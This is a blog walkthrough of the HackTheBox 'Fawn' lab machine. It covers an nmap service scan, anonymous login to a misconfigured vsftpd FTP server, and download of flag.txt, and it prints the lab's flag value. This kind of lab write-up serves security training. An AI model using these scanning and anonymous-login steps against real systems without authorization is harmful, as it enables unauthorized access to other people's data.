---
title: "HackTheBox Starting Point: Fawn Walkthrough"
date: 2025-01-08
description: 'This is my personal notes for HTB Fawn Machine'
image: '/public/static/htb-cover.jpg'
tags: ["FTP", "Misconfiguration"]
authors: ['chjwoo']
---


First, spawn the target machine. In this scenario, the machine's IP address is `10.129.93.27`.

## Reconnaissance

The first step is to enumerate the open ports and services on the target machine using `nmap`:

```bash
└─$ sudo nmap -sC -sV 10.129.93.27
[sudo] password for w1thre:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 13:25 WIB
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.93.27
Host is up (2.0s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.57 seconds
```

### Explanation of `nmap` Options
- **`-sV`**: Scans the discovered services to determine their versions.
- **`-sC`**: Performs a script scan using the default set of scripts.

From the enumeration results, we can see that the only open port is port 21, which indicates an FTP service is running on the target machine. Next, we will attempt to interact with this service.

## Foothold

To interact with the FTP service, run the `ftp` command on your host:

```bash
└─$ ftp 10.129.93.27
Connected to 10.129.93.27.
220 (vsFTPd 3.0.3)
Name (10.129.93.27:w1thre): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

After connecting to the FTP service, the prompt will ask for a username. Many FTP services are misconfigured to allow access using the `anonymous` account. Use `anonymous` as the username and either provide a random password or leave the password field blank.

Once logged in, search for files of interest using the `ls` command. Since `cat` cannot be used in the FTP session, any files need to be downloaded to your local machine for further inspection. For example, the `flag.txt` file can be downloaded using the `get` command:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||22248|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||49509|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |************************************************|    32       90.84 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.03 KiB/s)
ftp> bye
221 Goodbye.
```

## Flag

On your local machine, use the `cat` command to view the contents of the `flag.txt` file:

```bash
└─$ cat flag.txt    
035db21c881520061c53e0536e44f815
```

Congratulations! You have successfully retrieved the flag.

